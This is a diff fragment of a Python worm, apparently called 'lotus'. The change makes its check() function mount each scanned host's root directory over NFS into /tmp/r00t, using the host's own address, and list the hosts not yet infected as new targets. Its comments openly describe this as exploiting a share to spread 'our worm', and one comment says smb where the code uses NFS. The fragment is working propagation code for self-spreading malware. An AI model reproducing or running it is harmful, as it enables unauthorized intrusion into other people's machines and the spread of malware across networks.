@@ -43,7 +43,7 @@ def check():                                                                    
     target_list = []                                                                #Create a list to hold valid target ip's without our worm installed
     for ip in ssh():                                                                #Iterate over the ip's returned from the 'ssh' function        
         os.makedirs('/tmp/r00t', exist_ok = True)                                   #Create directory '/tmp/r00t' if not already there
-        subprocess.run(['mount -t nfs 10.0.2.10:/ /tmp/r00t/'], shell=True)         #Exploit smb to mount target root directory to '/tmp/r00t'
+        subprocess.run(['mount -t nfs ' + str(ip) +  ':/ /tmp/r00t/'], shell=True)         #Exploit smb to mount target root directory to '/tmp/r00t'
         if path.exists('/tmp/r00t/lotus') != True:                                  #if our worm is not found in '/tmp/r000t/':
             target_list.append(ip)                                                  #The ip is added to target_list
     return(target_list)                                                             #target_list is returned
